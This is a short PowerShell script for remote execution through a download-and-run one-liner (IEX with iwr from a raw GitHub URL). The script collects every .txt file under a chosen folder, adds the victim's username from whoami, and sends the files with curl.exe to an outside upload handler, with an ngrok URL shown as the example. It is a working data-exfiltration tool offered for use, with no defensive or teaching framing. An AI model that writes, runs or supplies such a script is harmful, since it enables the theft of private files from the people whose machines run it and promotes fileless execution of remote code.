# set $folder = folder to upload file
# set $upload_handler = url to upload handler on server
# powershell cmd: IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/[link to this file])
# $folder = 'I:\Personal\';
# $upload_handler ='http://40e1572afb74.ngrok.io/upload_handler.php';
$name = [uri]::EscapeDataString((whoami));
$a = ''; (Get-ChildItem $folder -Filter "*.txt" -Recurse -File | %{$a = $a + " -F `"file[]=@" + $_.FullName + "`" "});
$eval = "curl.exe $a $upload_handler`?folder=$name";
IEX $eval;
